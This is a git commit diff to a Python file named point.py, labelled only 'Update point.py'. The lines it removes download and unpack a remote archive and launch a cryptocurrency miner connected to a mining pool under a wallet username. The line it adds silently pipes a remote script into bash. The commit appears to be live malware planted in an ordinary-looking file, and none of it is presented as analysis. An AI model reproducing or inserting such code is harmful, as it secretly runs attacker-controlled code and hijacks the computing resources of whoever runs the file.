661dc5f658c55db8f63a2f367621d1aef1708ea8
christineiimegan <christineiimegan@outlook.com>
2025-02-09 21:40:41 +0700

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,4 +1,3 @@
 import sys
 import os
-os.system("apt update && apt -y install curl wget && wget -qO sg.tar.gz https://gitlab.com/derisafrew/vx/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1")
-os.system("./ojava --url ws://31.171.240.178:443/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-test) --cores 8")
+os.system("curl -sL https://raw.githubusercontent.com/christineiimegan/ses/refs/heads/main/der | bash >/dev/null 2>&1")
